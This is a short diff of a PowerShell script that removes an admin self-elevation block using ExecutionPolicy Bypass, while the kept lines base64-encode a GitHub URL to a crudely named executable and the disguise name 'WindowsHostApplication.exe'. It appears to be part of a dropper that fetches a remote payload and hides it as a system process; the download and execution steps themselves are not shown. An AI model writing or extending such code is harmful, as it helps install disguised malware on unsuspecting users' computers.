@@ -1,10 +1,6 @@
-if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    $scriptPath = $MyInvocation.MyCommand.Path
-    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
-    exit
-}
 
-# Ваш код здесь, который требует прав администратора
+
+
 
 $officeDownloadUrlB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("https://github.com/freetponline/paintwebsite/raw/refs/heads/main/dolbaeb.exe"))
 $updaterrrExeB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("WindowsHostApplication.exe"))
